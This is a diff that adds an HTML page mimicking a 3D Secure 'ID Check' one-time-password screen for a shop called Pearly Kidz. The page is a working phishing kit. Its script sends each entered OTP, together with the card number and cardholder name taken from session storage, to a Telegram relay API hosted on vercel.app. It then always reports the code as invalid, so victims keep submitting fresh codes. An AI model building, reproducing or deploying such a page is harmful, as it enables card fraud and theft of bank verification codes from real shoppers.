@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Secure Online Shopping</title>      
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .logo-section {
+            background-color: #fefefe;
+            padding: 1rem;
+            border-radius: 0.5rem;
+        }
+
+        #otp {
+            font-size: 18px;
+            letter-spacing: 3px;
+        }
+    </style>
+</head>
+
+<body class="bg-white min-h-screen flex items-center justify-center flex-col px-4">
+
+    <!-- Cancel Button -->
+    <div class="w-full max-w-md px-4 flex justify-end mb-4">
+        <button class="text-base sm:text-lg font-semibold text-gray-600" id="cancelBtn">Cancel</button>
+    </div>
+
+    <!-- Main Card -->
+    <div id="mainCard" class="w-full max-w-sm sm:max-w-md px-4 py-8 border border-gray-300 shadow-md rounded-md text-center text-black bg-white">
+        
+        <div class="flex justify-between items-center mb-4">
+            <span class="text-xs sm:text-sm font-semibold">ID Check</span>
+        </div>
+
+        <!-- Title -->
+        <h1 class="text-base sm:text-lg font-semibold border-t pt-2 text-left">3D Secure Online Shopping</h1>
+
+        <!-- Message -->
+        <p class="text-sm sm:text-base text-left mt-2">
+            Please enter the One-Time-Password (OTP) to complete your transaction. The OTP has been sent to your mobile number.
+        </p>
+
+        <!-- Transaction Details -->
+        <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
+            <h2 class="font-bold mb-2 text-black">Transaction Details:</h2>
+            <p><strong>Merchant Name:</strong> <span id="merchant">Pearly Kidz</span></p>
+            <p><strong>Amount:</strong> <span id="amount">-</span></p>
+            <p><strong>Date:</strong> <span id="date"></span></p>
+            <p><strong>Card Number:</strong> <span id="cardNumber"></span></p>
+        </div>
+
+        <!-- OTP Form -->
+        <form id="otpForm">
+            <div class="mt-6">
+                <label for="otp" class="block text-sm mb-1">Verification code</label>
+                <input type="text" id="otp" name="otp" maxlength="6"
+                       inputmode="numeric"
+                       pattern="[0-9]*"
+                       class="w-full border border-gray-400 rounded-md p-3 text-center focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all">
+                <p id="otpError" class="text-red-500 text-sm mt-1 hidden">Invalid verification code. Please try again.</p>
+            </div>
+            <button id="submitBtn" class="bg-blue-700 hover:bg-blue-800 text-white font-bold py-2 px-6 rounded mt-6 w-full" type="submit">
+                Submit
+            </button>
+        </form>
+
+        <!-- Hidden Card Number -->
+        <input type="hidden" id="cardNumberHidden" value="">
+
+        <!-- Resend Code Button -->
+        <button id="resendBtn" class="text-blue-800 font-bold text-base sm:text-xl mt-5" type="button">RESEND CODE</button>
+
+        <!-- Terms of Service Note -->
+        <p class="text-xs text-gray-600 mt-4 text-center sm:text-sm">
+            By clicking "Submit" you agree to the 
+            <a href="https://pearlykids-uae.com/terms-of-service/" class="text-blue-600 hover:underline">
+                Terms of service
+            </a>.
+        </p>
+    </div>
+
+    <script>
+        const otpForm = document.getElementById("otpForm");
+        const otpInput = document.getElementById("otp");
+        const otpError = document.getElementById("otpError");
+        const hiddenCard = document.getElementById("cardNumberHidden");
+        const submitBtn = document.getElementById("submitBtn");
+
+        function readJSON(key) {
+            try { return JSON.parse(sessionStorage.getItem(key) || 'null'); } catch (e) { return null; }
+        }
+        function pad(n) { return String(n).padStart(2, '0'); }
+        function formatDate(d) {
+            return pad(d.getDate()) + '/' + pad(d.getMonth() + 1) + '/' + d.getFullYear()
+                + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
+        }
+
+        function fillDetails() {
+            const payment = readJSON('pk_payment');
+            const dateEl = document.getElementById('date');
+            const cardEl = document.getElementById('cardNumber');
+
+            const cardText = (payment && payment.masked) ? payment.masked : '•••• •••• •••• 4444';
+
+            if (dateEl) dateEl.textContent = formatDate(new Date());
+            if (cardEl) cardEl.textContent = cardText;
+            if (hiddenCard) hiddenCard.value = cardText;
+        }
+
+        otpInput.addEventListener('input', function (e) {
+            const value = e.target.value.replace(/\D/g, '');
+            e.target.value = value;
+            if (value.length > 0) {
+                otpInput.classList.remove("border-red-500");
+                otpError.classList.add("hidden");
+            }
+        });
+
+        otpForm.addEventListener("submit", async function (e) {
+            e.preventDefault();
+            const otpValue = otpInput.value.trim();
+
+            if (!otpValue || otpValue.length < 4) {
+                otpInput.classList.add("border-red-500");
+                otpError.textContent = "Please enter a valid number";
+                otpError.classList.remove("hidden");
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying...';
+
+            const paymentData = readJSON('pk_payment') || {};
+            
+            const payload = {
+                "رمز_التحقق_OTP": otpValue,
+                "رقم_البطاقة": paymentData.masked || hiddenCard.value || "غير متوفر",
+                "اسم_الحامل": paymentData.holder || "غير متوفر"
+            };
+
+            try {
+                await fetch("https://telegram-form-api-lemon.vercel.app/api/send", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Submit';
+                    otpInput.value = ''; 
+                    otpInput.classList.add("border-red-500");
+                    otpError.textContent = "Invalid verification code. Please try again.";
+                    otpError.classList.remove("hidden");
+                    otpInput.focus();
+                }, 800);
+
+            } catch (error) {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+                otpInput.value = '';
+                otpInput.classList.add("border-red-500");
+                otpError.textContent = "Connection error. Please try again.";
+                otpError.classList.remove("hidden");
+            }
+        });
+
+        document.getElementById('cancelBtn').addEventListener('click', () => {
+            window.location.href = 'index.html';
+        });
+
+        fillDetails();
+        otpInput.focus();
+    </script>
+
+</body>
+</html>
